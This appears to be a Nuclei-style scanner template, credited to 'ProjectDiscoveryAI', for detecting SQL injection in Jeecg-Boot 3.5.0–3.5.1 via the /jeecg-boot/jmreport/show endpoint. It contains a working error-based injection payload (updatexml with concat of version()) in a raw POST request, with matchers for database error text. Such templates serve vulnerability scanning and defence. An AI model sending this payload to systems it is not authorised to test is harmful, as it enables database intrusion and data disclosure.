id: jeecg-boot-sql-injection
info:
  name: Jeecg-Boot SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Jeecg-Boot versions 3.5.0 and 3.5.1 are vulnerable to a SQL Injection vulnerability in the /jeecg-boot/jmreport/show endpoint via the 'id' parameter.
  tags: sql-injection,jeecg-boot,critical

http:
  - raw:
      - |
        POST /jeecg-boot/jmreport/show HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
        Connection: close
        Content-Type: application/json;charset=UTF-8

        {
          "id": "961455b47c0b86dc961e90b5893bff05",
          "apiUrl": "",
          "params": {
            "id": "1 ' or ' % 1 % ' like (updatexml(0x3a,concat(1,(version())),1)) or ' % % ' like '"
          }
        }
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "MySQL"
          - "syntax error"
          - "version()"
          - "PostgreSQL"
          - "SQL Server"
      - type: regex
        part: body
        regex:
          - "updatexml.*concat.*version"